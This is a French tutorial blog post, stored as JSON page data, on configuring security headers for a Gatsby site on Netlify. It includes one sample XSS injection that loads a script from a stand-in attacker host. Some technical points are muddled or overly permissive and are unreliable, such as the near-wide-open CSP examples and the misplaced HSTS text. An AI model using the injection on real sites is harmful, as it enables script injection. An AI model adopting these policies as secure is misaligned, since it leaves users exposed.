{"data":{"prismicPost":{"id":"23a9104d-8bac-5b2f-a910-1bf9bc1a50f2","data":{"post_title":{"text":"Security headers ou comment bien sécuriser vos applications web "},"post_preview_description":{"text":"Les en-têtes de sécurité - adorés par les équipes de sécurité et détestés par les développeurs. Ils indiquent aux utilisateurs de votre application web ce à quoi ils doivent s'attendre et ce qu'elle peut faire. Voyons ensemble si votre application répond aux standards de sécurité actuels"},"post_body":[{"__typename":"PrismicPostPostBodyText","id":"ac1010f0-0397-553b-88eb-5f0c8d94bbd7","primary":{"rich_text":{"html":"<p>Les en-têtes de sécurité - adorés par les équipes de sécurité et détestés par les développeurs - indiquent aux utilisateurs de votre application web ce à quoi ils doivent s&#39;attendre et ce qu&#39;elle peut faire. La question est de savoir comment pouvez-vous vous assurer que votre application dispose des bons en-têtes.</p><p>Je construis des sites statiques en utilisant Gatsby et j&#39;ai constaté qu&#39;<strong>un grand nombre de sites construits de cette manière n&#39;ont pas d&#39;en-tête de sécurité</strong>. Pour moi, une partie de la liste de contrôle de mise en service doit garantir que l&#39;application m&#39;offre à moi et mon entreprise et bien sûr l&#39;utilisateur, un maximum de de sécurité. Un bon moyen d&#39;y parvenir est de définir les en-têtes de sécurité sur votre site.</p><p>Faisons d&#39;abord un tour pour voir ce que sont les <strong>security-headers, </strong>ensuite nous verront concrètement <strong>comment les appliquer</strong>, et enfin <strong>comment tester notre application</strong>. Ce tour n&#39;a pas pour but d&#39;être exhaustif, mais vous donnera les bases pour démarrer je l&#39;espère.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"1309e843-9172-5f1f-8586-276f72efb919","primary":{"hn":{"text":"Pourquoi utiliser des security headers ?","html":"<h2>Pourquoi utiliser des security headers ?</h2>"}}},{"__typename":"PrismicPostPostBodyText","id":"494fe622-9a0f-5a80-9167-14881abfe239","primary":{"rich_text":{"html":"<p>Nous utilisons des en-têtes de sécurité pour informer le navigateur des attentes de notre application. Cela couvre des choses comme :</p><ul><li>Définir une liste des sources de données et de scripts externes que nous avons l&#39;intention d&#39;utiliser (ChatBot, Google Analytics)</li><li>Comment notre demande peut se présenter (Iframe, script, image)</li><li>Les caractéristiques de l&#39;appareil avec lequel notre application interagit. (Geolocalisation, microphone...)</li></ul><p>Ces en-têtes contribuent à protéger notre application, nos données et nos utilisateurs contre les attaques. La plupart des en-têtes de cet article traitent du cross-site scripting (XSS). XSS est le terme utilisé lorsque l&#39;on injecte du code nuisible dans une application.</p><p>Un classique dans tout projet d&#39;application web est d&#39;utiliser les services d&#39;une tierce partie pour effectuer des tests de pénétration ou &quot;pentest&quot; sur votre application. L&#39;une des premières choses qui sera testée est l&#39;en-tête de sécurité. Cela va de pair avec le &quot;Top 10&quot; de l&#39;<a  href=\"https://owasp.org/\">OWASP</a>. Il existe donc un projet dédié aux <a  href=\"https://owasp.org/www-project-secure-headers/\">en-têtes de sécurité de l&#39;OWASP</a> </p><p>Mais pourquoi est-ce important si vous générez un site statique, si vous <a  href=\"/blog/creer-son-site-avec-gatsby-et-prismic\">créez votre site avec Gatsby et Prismic</a> par exemple ? Cela dépend de ce que fait votre site (ou application). Au fur et à mesure que vous ajoutez des services externes pour les évaluations des clients, les formulaires de contact, l&#39;intégration e-commerce, etc.  ces autres fonctionnalités ajoutées peuvent vous exposer, ainsi que vos clients et votre organisation. Pour être franc, même si vous n&#39;ajoutez pas de services externes, il y a un risque. <strong>Ce risque est facilement réduit en utilisant quelques en-têtes de sécurité de base.</strong></p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"3eb40996-61db-5f31-830c-f6273934aaef","primary":{"hn":{"text":"Quels en-têtes de sécurité pour vos applications ?","html":"<h2>Quels en-têtes de sécurité pour vos applications ?</h2>"}}},{"__typename":"PrismicPostPostBodyText","id":"e2848bd9-590a-5055-83dd-7ad3097e4473","primary":{"rich_text":{"html":"<p>En général, vous voulez en couvrir le plus grand nombre possible. Il n&#39;y a cependant aucun intérêt à définir un en-tête de sécurité d&#39;une manière totalement non sécurisée. Dans ces cas, je dirais que l&#39;en-tête peut et doit probablement être exclu.</p><p>La liste des en-têtes de sécurité de l&#39;OWASP est la suivante :</p><ol><li><a  href=\"https://owasp.org/www-project-secure-headers/#http-strict-transport-security-hsts\">HTTP Strict Transport Security (HSTS)</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#public-key-pinning-extension-for-http-hpkp\">Public Key Pinning Extension for HTTP (HPKP)</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#x-frame-options\">X-Frame-Options</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#x-xss-protection\">X-XSS-Protection</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#x-content-type-options\">X-Content-Type-Options</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#Content-Security-Policy\">Content-Security-Policy</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#x-permitted-cross-domain-policies\">X-Permitted-Cross-Domain-Policies</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#referrer-policy\">Referrer-Policy</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#expect-ct\">Expect-CT</a></li><li><a  href=\"https://owasp.org/www-project-secure-headers/#feature-policy\">Feature-Policy</a></li></ol><p>Pour nos besoins, j&#39;ai choisi quelques-uns des en-têtes qui ont le plus d&#39;impact concernant le XSS. Les trois en-têtes suivants sont ceux qui font un peu plus parler d&#39;eux et qui sont plus essentiels en matière de sécurité des applications. J&#39;espère néanmoins pouvoir couvrir les autres rapidement.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"2f1b6e4a-2bcc-54d9-b573-7491b1c5e85d","primary":{"hn":{"text":"Content-Security-Policy (CSP)","html":"<h3>Content-Security-Policy (CSP)</h3>"}}},{"__typename":"PrismicPostPostBodyText","id":"f369e980-59de-5626-8860-ede9e82f3dbb","primary":{"rich_text":{"html":"<p>Le CSP est l&#39;un des moyens les plus efficaces de protéger votre application contre les XSS. En bref, il <strong>établit une liste blanche</strong> des sources de contenu approuvées pour votre application. Le CSP indique au navigateur de ne pas charger d&#39;autres sources de contenu dans notre application.</p><p><strong>C&#39;est un en-tête assez puissant et pas forcément facile à mettre en place </strong>pour les applications web. Il est courant pour une application web d&#39;utiliser de nombreuses sources de contenu pour fournir des fonctionnalités, du contenu et une interface utilisateur (chatbot, google analytics, google fonts...) C&#39;est un peu délicat car le nombre de paramètre possible est important - <a  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></p><p>De manière pratique, si une directive n&#39;est pas définie, le navigateur utilisera la valeur par défaut de source.</p><p>Il y a deux choses à noter à propos de CSP  :</p><ol><li>Contrairement à certains autres en-têtes, <strong>vous ne pouvez définir l&#39;en-tête CSP qu&#39;une seule fois</strong>. La dernière lue par le navigateur est celle qui sera utilisée.</li><li><strong>Les scripts et les styles en ligne ne sont pas compatibles</strong> avec cette règle et vous obligent soit à définir unsafe-inline, soit à effectuer un peu de logique supplémentaire.</li></ol><p>Utiliser les styles en ligne nécessite que vous créiez un hachage du contenu. C&#39;est en général une chose simple à faire. Chrome le rend assez facile à comprendre avec un message clair dans la console, dans ce cas pour  un simple  :</p><p></p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"3e3a5121-b863-55ab-ac26-f0fc5860ae3e","primary":{"hn":{"text":"Validation des CSP avec hashage","html":"<h4>Validation des CSP avec hashage</h4>"}}},{"__typename":"PrismicPostPostBodyText","id":"6763a707-fe8f-5ffb-af16-194deb366de5","primary":{"rich_text":{"html":"<p>Voyons un exemple si votre CSP a été défini de la sorte <em>&#39;script-src&#39;: `&#39;self&#39;  </em>et<em> que vous utilisez le code suivant</em></p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"437ef91c-6ae2-5a50-87da-20a38169ed2e","primary":{"code_snippet":{"text":"<script>alert('Hello world.')</script>"},"language":{"text":"html"}}},{"__typename":"PrismicPostPostBodyImage","id":"ac38c233-84a1-59d2-a4b4-9bef2381061c","primary":{"image":{"alt":"content security policy error","dimensions":{"height":126,"width":880},"localFile":null}}},{"__typename":"PrismicPostPostBodyText","id":"33b718ed-d86d-519c-b611-068762214dff","primary":{"rich_text":{"html":"<p>Le script refuse de s&#39;éxcécuter. On nous donne néanmoins la solution, il faut passer le hash que nous devons ajouter <em>sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng=</em>. Mais vous pouvez également obtenir ce hash en tapant la commande suivante </p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"620c3b5a-59b1-5311-be0c-4d19ac81dd78","primary":{"code_snippet":{"text":"echo -n \"alert('Hello, world.');\" | openssl dgst -sha256 -binary | openssl enc -base64"},"language":{"text":"bash"}}},{"__typename":"PrismicPostPostBodyText","id":"9846b02f-5d69-59eb-91fb-c1cc76a36ffe","primary":{"rich_text":{"html":"<p><br /><strong>Si vous n&#39;êtes pas sûr</strong> de ce que votre CSP doit contenir, si vous êtres par exemple en train de mettre ça sur une grosse application web vous pouvez utiliser l&#39;en-tête <strong>Content-Security-Policy-Report-Only</strong>, cela évitera de planter votre application et vous permettra d&#39;ajuster plus facilement. <br />Au final les règles ne seront donc pas directement appliquées, mais un rapport à la place sera envoyé au format JSON à un endpoint que vous aurez déterminé. Ce rapport vous permettra ainsi de travailler de manière itérative sur votre politique de sécurité du contenu. <br />Cela peut être particulièrement utile lorsque vous utilisez des sources tierces telles que Google Tag Manager qui peut injecter du contenu provenant de plusieurs sources. </p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"0a2bb6f3-08c8-5c6c-a165-f72163d62a6b","primary":{"code_snippet":{"text":"Content-Security-Policy: default-src 'self'; report-uri http://reportcollector.example.com/collector.php"},"language":{"text":"bash"}}},{"__typename":"PrismicPostPostBodyText","id":"4554e9ac-adf3-5dd4-84dc-6c1697abaac4","primary":{"rich_text":{"html":"<p>Et un exemple de rapport qui peut vous être transmis </p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"7fcf0dab-a27c-5357-924d-ddb20c6aaa87","primary":{"code_snippet":{"text":"{\n  \"csp-report\": {\n    \"document-uri\": \"http://example.com/connexion.html\",\n    \"referrer\": \"\",\n    \"blocked-uri\": \"http://example.com/css/style.css\",\n    \"violated-directive\": \"style-src cdn.example.com\",\n    \"original-policy\": \"default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports\"\n  }\n}"},"language":{"text":"json"}}},{"__typename":"PrismicPostPostBodyText","id":"c7578cd2-1689-57b1-91d6-5578b57c313d","primary":{"rich_text":{"html":"<p>Il existe encore deux possibilités pour contrôler vos scripts.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"804ac13b-04a0-5ebc-ba3a-75807582ffc2","primary":{"hn":{"text":"Validation avec nonce","html":"<h4>Validation avec nonce</h4>"}}},{"__typename":"PrismicPostPostBodyText","id":"f578604d-bd93-5c05-a043-9e2690e3517b","primary":{"rich_text":{"html":"<p>Passer à la CSP la valeur <a  href=\"https://content-security-policy.com/nonce/\">nonce</a> (non supporté sur I.E. petit ange parti trop tard) pour faire simple plutôt que de passer un hash complexe, l&#39;idée est de passer une chaîne plus simple (on va éviter toto), utilisable une fois et de la faire matcher avec notre script </p><p></p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"89a52d04-0efd-5967-b70c-c2d015008ab9","primary":{"code_snippet":{"text":"Content-Security-Policy: script-src 'nonce-r@nd0m' 'self';"},"language":{"text":"bash"}}},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"6effa89d-5572-50dd-816f-90ea346292ee","primary":{"code_snippet":{"text":"<script nonce=\"r@nd0m\">\n\tdoWhatever();\n</script>"},"language":{"text":"html"}}},{"__typename":"PrismicPostPostBodyHn","id":"08d47886-c0b7-59b8-8843-1dc1c640c3c9","primary":{"hn":{"text":"Utilisation de 'unsafe-line'","html":"<h4>Utilisation de &#39;unsafe-line&#39;</h4>"}}},{"__typename":"PrismicPostPostBodyText","id":"aabf8841-47a6-5fe8-8e0f-30c68634c7ae","primary":{"rich_text":{"html":"<p><strong>Sauf dans un cas très spécifique, vous devez éviter d&#39;utiliser le mot-clé &quot;unsafe-inline&quot; dans votre politique de CSP. Comme vous pouvez le deviner, il est généralement dangereux d&#39;utiliser le mot-clé &quot;unsafe-inline&quot;.</strong></p><p>Unsafe-inline annule en effet la plupart des bénéfices de votre CSP. Dans ces cas là il est important de combiner ceci avec la directive self. En effet des scripts en ligne pourront potentiellement être injectés. Mais il sera par exemple impossible d&#39;appeler cet url dans votre application.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"55aabc62-417f-5fb3-9d2f-f748d7810a97","primary":{"code_snippet":{"text":"/app?name=<script src=\"https://bad-guy.example.com/bad-stuff.js\"></script>"},"language":{"text":"bash"}}},{"__typename":"PrismicPostPostBodyText","id":"3a868f11-a8f7-5e0a-9851-680795dd38f0","primary":{"rich_text":{"html":"<p>c&#39;est tout pour la CSP place à la Feature Policy / Permissions-Policy</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"8ea10638-8716-5dcf-8033-f6ba0feaa7e9","primary":{"hn":{"text":"Feature-Policy / Permissions-Policy","html":"<h3>Feature-Policy / Permissions-Policy</h3>"}}},{"__typename":"PrismicPostPostBodyText","id":"246e7038-d08a-524c-b62a-a13dd45d6b5c","primary":{"rich_text":{"html":"<p>Feature Policy nous permet de spécifier les fonctionnalités notre application peut et ne peut pas utiliser. Cela concerne les événements à vibration, l&#39;utilisation de la caméra et du microphone. La liste complète des éléments que vous pouvez contrôler est longue et peut être consultée sur le <a  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy Strict-Transport-Securityhttps://\">site des développeurs Mozilla</a> :</p><p>Souvent appelé HSTS, cet en-tête indique à l&#39;agent utilisateur de faire respecter l&#39;utilisation du HTTPS, renforçant ainsi votre mise en œuvre du TLS. Sous le capot, l&#39;objectif de cet en-tête est de rappeler à l&#39;agent utilisateur que ce site doit être accessible sur HTTPS.</p><p>L&#39;exemple le plus courant est l&#39;accès à vos opérations bancaires habituelles sur Internet à partir d&#39;un emplacement WiFi public. Tant que vous avez été sur le site web de votre banque à partir d&#39;un endroit sécurisé (et que le HSTS a été mis en place), l&#39;agent utilisateur saura que le site doit être accessible par HTTPS. Cela signifie que si le WiFi public est compromis d&#39;une manière ou d&#39;une autre, l&#39;agent utilisateur n&#39;acceptera pas la connexion non HTTPS.</p><p>En outre, comme l&#39;agent utilisateur sait que l&#39;application doit être accessible par HTTPS, il est possible d&#39;éviter les redirections 301 inutiles pour les versions non HTTPS de l&#39;application.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"43c507bf-812c-5e65-8e27-7ec96ad3a25e","primary":{"hn":{"text":"L'entête de sécurité X-Frame-Options","html":"<h3>L&#39;entête de sécurité X-Frame-Options</h3>"}}},{"__typename":"PrismicPostPostBodyText","id":"72f1d880-0d30-565c-99b3-de7bbaacb19c","primary":{"rich_text":{"html":"<p>L&#39;en-tête X-Frame-Options indique à l&#39;agent utilisateur si vous souhaitez autoriser ou non votre site à être embarqué sous forme d&#39;iframe. En empêchant l&#39;application d&#39;être intégrée dans un iframed, vous pouvez contribuer à réduire la probabilité d&#39;attaques de type &quot;clickjacking&quot;.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"12b319de-405b-5621-9a3f-b01051ec97da","primary":{"hn":{"text":"Comment installer les entêtes de sécurité dans un site web ?","html":"<h2>Comment installer les entêtes de sécurité dans un site web ?</h2>"}}},{"__typename":"PrismicPostPostBodyText","id":"13f682f4-f4f0-5e58-bfba-8646c7130a45","primary":{"rich_text":{"html":"<p>La façon dont vous construisez et hébergez votre application a une grande influence sur la façon dont vous définissez les en-têtes de sécurité. Les différents fournisseurs d&#39;hébergement ont différentes façons de définir les en-têtes au niveau de l&#39;application, et les différentes stack vous offrent également différentes options. Nous allons nous intéresser ici surtout à la JamStack</p><p>Ici, je vais donc vous expliquer <strong>comment définir ces en-têtes dans une application Gatsby hébergée chez Netlify.</strong></p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"ab2c3e38-6c27-5be8-abd3-e0f3f4768fcf","primary":{"hn":{"text":"Mise en place via le HTML","html":"<h3>Mise en place via le HTML</h3>"}}},{"__typename":"PrismicPostPostBodyText","id":"fadeb0d8-d60b-55bb-b76a-6848e8d1ac33","primary":{"rich_text":{"html":"<p>L&#39;une des <strong>méthodes</strong> les plus <strong>simples</strong> pour définir les en-têtes de réponse HTTP d&#39;une page web est de les définir <strong>dans l&#39;en-tête</strong> - &lt;head&gt; - du document HTML.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"8afebe9b-9206-5d26-a85b-9aa5518eb140","primary":{"code_snippet":{"text":"<meta http-equiv=\"Content-Security-Policy\" \n      content=\"script-src 'self';\n               style-src 'self';\n               image-src ‘self;\">"},"language":{"text":"html"}}},{"__typename":"PrismicPostPostBodyText","id":"fba72383-862c-5710-9670-7a6e3e205acf","primary":{"rich_text":{"html":"<p>La meta <em>http-equiv </em>indique au user-agent d&#39;utiliser le contenu fourni comme en-tête de réponse HTTP. Ce que j&#39;ai remarqué avec cela dans Chrome, c&#39;est que cela ne fonctionne pas toujours correctement. Vous recevrez toujours des notifications de la console si l&#39;en-tête de votre CSP est mal défini, mais il n&#39;apparaîtra pas nécessairement dans l&#39;onglet Réseau lorsque vous afficherez les en-têtes de documents.</p><p>Cette approche vous permet également de <strong>définir des valeurs individuelles pour chaque page</strong>, plutôt que d&#39;appliquer la même valeur à l&#39;ensemble de l&#39;application.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"2ba31b75-721d-539a-a574-0d65fd1b360e","primary":{"hn":{"text":"Comment installer les entêtes de sécurité dans Gatsby ?","html":"<h2>Comment installer les entêtes de sécurité dans Gatsby ?</h2>"}}},{"__typename":"PrismicPostPostBodyText","id":"7fbef9a9-466b-5574-9522-54747b5c33be","primary":{"rich_text":{"html":"<p>Lorsque nous pensons à des générateurs de sites statiques comme Gatsby, nous envisageons la séparation de la source de données et décidons qu&#39;ils sont sécurisés, car il n&#39;y a pas d&#39;accès aux données sources. En réalité, nous ajoutons des formulaires et connectons d&#39;autres services pour créer une application plus complète. Ainsi, par exemple, nous ajoutons FormStack ou Snipcart à notre application pour ajouter des formulaires de contact ou des fonctionnalités e-commerce.</p><p>Plusieurs options sont disponibles avec les sites statiques, et certaines d&#39;entre elles dépendent de l&#39;endroit où vous hébergez votre application.</p><p></p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"9df21951-6277-5150-b854-11d2c693b9bf","primary":{"hn":{"text":"Via la meta http-equiv et le plugin gatsby-plugin-csp","html":"<h3>Via la meta http-equiv et le plugin gatsby-plugin-csp</h3>"}}},{"__typename":"PrismicPostPostBodyText","id":"72034880-05e5-5c65-91a5-bf14bb51d8a0","primary":{"rich_text":{"html":"<p>Du point de vue content-security-policy, vous pouvez ajouter le plugin gatsby-plugin-csp. Ce plugin vous permet de configurer les parties communes de l&#39;en-tête du CSP, mais peut également ajouter automatiquement les hachages des composants en ligne au fur et à mesure de la construction de votre application.</p><p>À titre d&#39;exemple, voici la configuration de gatsby-plugin-csp (dans gatsby-config.js) que j&#39;expérimentais pour mon site.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"eb83f0e6-dbeb-5c7b-afc8-809efb65e501","primary":{"code_snippet":{"text":"    {\n       resolve: `gatsby-plugin-csp`,\n       options: {\n         mergeScriptHashes: false,\n         mergeStyleHashes: false,\n         directives: {\n           'script-src': `'self' 'unsafe-inline' `,\n           'style-src': \"'self' 'unsafe-inline'\",\n           'font-src': `'self' data: db.onlinewebfonts.com`,\n         },\n       },\n    },"},"language":{"text":"javascript"}}},{"__typename":"PrismicPostPostBodyText","id":"06855f02-a112-5d2f-b06b-508e4487bc43","primary":{"rich_text":{"html":"<p>Le résultat est que l&#39;en-tête CSP est ajouté avec la meta<em> http-equiv</em>. L&#39;exemple ci-dessus permet tout ce qui est HTTPS.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"70c53157-7676-508c-9aef-c0ccd97ceac8","primary":{"hn":{"text":"Définir les entêtes sur Netlify ","html":"<h3>Définir les entêtes sur Netlify </h3>"}}},{"__typename":"PrismicPostPostBodyText","id":"b4c9f877-9c5c-5ca4-a938-2fc56a7fa6e1","primary":{"rich_text":{"html":"<p>Deux possibilités pour modifier directement les entêtes directement sur le serveur</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"8630a859-ab4e-5426-823b-e017e6fa8685","primary":{"hn":{"text":"Le fichiers _headers","html":"<h4>Le fichiers _headers</h4>"}}},{"__typename":"PrismicPostPostBodyText","id":"099a45f0-45f0-5682-8ab9-c47d1d74d4e0","primary":{"rich_text":{"html":"<p>Netlify utilise un fichier pour spécifier les en-têtes qui peuvent être appliqués aux applications qu&#39;il héberge. Ce fichier est nommé _headers et se trouve dans le répertoire publish de votre site.</p><p>Lorsque j&#39;utilise ce fichier, je le place dans mon dossier statique. En général, j&#39;utilise un fichier assez simple, mais il peut devenir plus complexe si vous en avez besoin. Voici un exemple tiré d&#39;un site sur lequel j&#39;ai travaillé récemment :</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"c25e58ac-3f26-56a0-871a-9510c7df2292","primary":{"code_snippet":{"text":"/*\n  X-Frame-Options: SAMEORIGIN\n  X-XSS-Protection: 1; mode=block\n  X-Content-Type-Options: nosniff\n  Content-Security-Policy: default-src 'self' https://*.kc-usercontent.com https://*.google-analytics.com; font-src data:; style-src 'self' 'unsafe-inline' https://*.googletagmanager.com; script-src 'self' 'unsafe-inline' https://*.googletagmanager.com https://*.google-analytics.com\n  Referrer-Policy: strict-origin-when-cross-origin\n  Feature-Policy: geolocation 'self'\n  Feature-Policy: midi 'self'\n  Feature-Policy: notifications 'self'\n  Feature-Policy: push 'self'\n  Feature-Policy: sync-xhr 'self'\n  Feature-Policy: microphone 'self'\n  Feature-Policy: camera 'self'\n  Feature-Policy: magnetometer 'self'\n  Feature-Policy: gyroscope 'self'\n  Feature-Policy: speaker 'self'\n  Feature-Policy: vibrate 'self'\n  Feature-Policy: fullscreen 'self'\n  Feature-Policy: payment 'self'"},"language":{"text":"bash"}}},{"__typename":"PrismicPostPostBodyText","id":"57abfe49-16dd-5846-a193-839e60deabf9","primary":{"rich_text":{"html":"<p>En fonction de l&#39;application il peut être délicat d&#39;ajouter ce fichier _headers. Pour votre site Gatsby déployé sur Netlify je vous recommande plutôt d&#39;utiliser directement le fichier <strong>netlify.toml</strong> à mettre à  la racine de votre projet.</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"bce5b485-1b2a-534f-851c-bbd42b72b121","primary":{"hn":{"text":"Le fichier .toml","html":"<h2>Le fichier .toml</h2>"}}},{"__typename":"PrismicPostPostBodyCodeSnippet","id":"3bd573e4-ee9f-5283-8d8b-7b01575bf6ec","primary":{"code_snippet":{"text":"[[plugins]]\n  package = \"@netlify/plugin-lighthouse\"\n\n  # Bonus ma configuration pour google page speed\n  [plugins.inputs.thresholds]\n    performance = 0.5\n    accessibility = 0.5\n    best-practices = 0.5\n    seo = 0.9\n    pwa = 0.5\n# Configuration de vos CSP et plus encore\n[[headers]]\n  for = \"/*\"\n  [headers.values]\n    Strict-Transport-Security = \"max-age=63072000; includeSubDomains; preload\"\n    Content-Security-Policy = \"default-src data: 'unsafe-inline'  https:; script-src data: 'unsafe-inline'  https: blob:; style-src data: 'unsafe-inline' https:; img-src data: https: blob:; font-src data: https:; connect-src https: wss: blob:; media-src https: blob:; object-src https:; child-src https: data: blob:; form-action https:; block-all-mixed-content\"\n    X-Frame-Options = \"DENY\"\n    X-Content-Type-Options = \"nosniff\"\n    Referrer-Policy = \"no-referrer\"\n    Feature-Policy = \"microphone 'none'; geolocation 'none'\"\n    Permissions-Policy= \"geolocation=(), microphone=()\"\n"},"language":{"text":"toml"}}},{"__typename":"PrismicPostPostBodyText","id":"79b8d817-5ea3-5f73-9eab-de7de2cd43a4","primary":{"rich_text":{"html":"<p><a  href=\"https://docs.netlify.com/routing/headers/#syntax-for-the-headers-file\">Pour en savoir plus sur la configuration des fichiers headers dans Netlify</a> Vous avez également la possibilité de <a  href=\"https://play.netlify.com/headers\">tester votre fichier de règles</a>, ce qui peut s&#39;avérer très pratique et vous éviter des builds inutiles. <br />Il est possible également d&#39;utiliser un <a  href=\"https://www.gatsbyjs.com/plugins/gatsby-plugin-netlify-headers/\">plugin gatsby</a> pour vous générer ce fichier il permet également d&#39;appliquer des règles à des pages spécifiques.</p><p>Enfin je vous recommande vivement ce site pour <a  href=\"https://report-uri.com/home/generate\">générer vos CSP</a> surtout si elles sont chargées</p>"}},"slice_type":"text"},{"__typename":"PrismicPostPostBodyHn","id":"a0fb3ade-ef76-5d19-baf9-0cb741444723","primary":{"hn":{"text":"Tester les headers de  vos applications web","html":"<h2>Tester les headers de  vos applications web</h2>"}}},{"__typename":"PrismicPostPostBodyText","id":"b5a3d55b-517c-57fa-88d9-f76112e29f7f","primary":{"rich_text":{"html":"<p>Lorsqu&#39;il s&#39;agit de <strong>tester vos en-têtes</strong>, il y a deux choses à prendre en compte :</p><p><strong>Sont-ils vraiment là ?</strong><br />Ils sont là, mais <strong>fonctionnent-ils</strong> ?</p><p>Pour la première question, le test est simple. Le plus simple est d&#39;utiliser les <strong>outils de développement </strong>de votre navigateur pour afficher les en-têtes de réponse et voir ce qui est présent - mais vous devez savoir ce que vous recherchez.</p><p>Il existe également de nombreux outils gratuits disponibles en ligne qui analyseront votre demande et vous indiqueront les en-têtes qu&#39;elle a trouvés. J&#39;en citerai deux qui sont les plus utilisés :</p><p>Le vérificateur d&#39;en-têtes de sécurité de <a  href=\"https://www.serpworx.com/\">SerpWorx</a> et <a  href=\"https://securityheaders.com/\">SecurityHeaders.com</a> </p><p>Les deux sont très similaires dans leur manière de travailler. Une fois votre analyse terminée, vous obtenez plus de détails et un résumé des en-têtes qui ont été vérifiés. SecurityHeaders.com vous donnera une note de A+ à F (et R, qui devrait signifier &quot;Run Away&quot;), tandis que SerpWorx vous donnera une note sur 100.</p>\n    <p class=\" block-img\">\n      <img src=\"https://prismic-io.s3.amazonaws.com/kovsky-blog/3c79ad1e-dce3-4bd3-9e87-e85d94035407_security3.png\" alt=\"\" copyright=\"\">\n    </p>\n  <p>Vérifier que les en-têtes fonctionnent est une tâche plus complexe. Il vous faut comprendre comment se comporte chacun des en-têtes que vous mettez en œuvre. Une fois que vous avez compris cela, vous pouvez créer des scénarios de test pour vous assurer que les en-têtes fonctionnent.</p><p>Et n&#39;oubliez pas, vous pouvez toujours me contacter sur les réseaux ou ici si vous recherchez un <a  href=\"https://www.developpeur-web.tech\">développeur web sur Toulouse</a>. </p>"}},"slice_type":"text"}],"post_hero_image":{"alt":"sécurité application","dimensions":{"height":517,"width":896},"localFile":null}}}},"pageContext":{"uid":"security-headers-gatsby-netlify","category":"securite"}}